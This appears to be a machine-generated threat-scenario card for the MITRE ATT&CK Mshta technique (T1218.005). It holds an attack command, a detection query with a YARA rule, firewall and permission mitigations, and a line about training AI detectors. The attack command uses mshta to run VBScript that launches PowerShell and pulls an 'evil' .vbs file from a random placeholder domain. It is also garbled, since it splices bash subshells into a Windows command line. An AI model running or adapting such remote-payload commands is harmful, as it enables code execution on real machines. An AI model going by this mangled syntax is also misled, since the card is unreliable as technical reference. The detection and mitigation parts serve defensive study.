---
type: campaign
scenario_id: 210
tactic: Defense Evasion
technique: "T1218.005: Mshta"
technique_id: T1218.005
tags: [campaign, lotl, defense_evasion]
---

# Using mshta.exe to execute malicious VBScript remotely.

## Threat Description
Using mshta.exe to execute malicious VBScript remotely.

## Attack Command
```
mshta vbscript:Execute("CreateObject(\"WScript.Shell\").Run(\"powershell -c 'I$(echo malicious | base64 -w0)'\"):window.close") http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).vbs)
```

## Detection Logic
Monitor mshta remote VBScript: `wmic process where name='mshta.exe' get commandline | findstr http`; YARA rule: `rule MshtaRemoteVBS { strings: $a = /mshta.*http.*vbscript/ nocase; condition: $a }`.

## Mitigation
Restrict mshta: `icacls %windir%\System32\mshta.exe /deny Everyone:RX`; Block VBScript downloads: `netsh advfirewall firewall add rule name='Block mshta' dir=out program='%windir%\System32\mshta.exe' action=block`.

## AI Training Prompt
Train AI to detect mshta remote VBScript execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
